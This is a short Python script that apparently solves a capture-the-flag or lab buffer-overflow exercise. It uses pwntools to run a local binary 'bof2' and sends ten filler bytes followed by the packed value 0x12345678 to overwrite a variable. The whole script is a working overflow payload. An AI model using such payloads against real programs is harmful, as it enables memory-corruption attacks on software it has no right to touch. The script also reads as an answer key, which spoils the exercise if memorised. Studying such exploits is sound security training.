#!/usr/bin/python3

from pwn import *

p = process("./bof2")
#payload = p32(0x12345678,little) #answer here
payload = pack(0x12345678, 32, 'little', 'signed')
print(u32(payload))
p.sendline(b"A"*10 + payload)
print(p.recvline())
print(p.recvline())
print(p.recvline())
